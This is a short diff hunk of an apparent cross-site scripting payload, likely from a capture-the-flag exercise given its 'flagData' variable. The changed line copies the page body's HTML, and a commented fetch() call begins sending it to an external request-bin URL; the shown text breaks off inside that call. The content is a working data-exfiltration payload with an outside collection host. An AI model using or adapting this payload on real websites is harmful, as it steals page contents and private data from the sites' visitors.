@@ -9,7 +9,7 @@
   <script>
     // XSS payload to change the title and exfiltrate data
     document.title = 'Payload executed';
-    var flagData = document.getElementsByTagName('html')[0].innerHTML;
+    var flagData = document.body.innerHTML;
     
     // Send flagData to a request bin using Fetch API
     fetch('https://eoue93psy15d0ln.m.pipedream.net', {
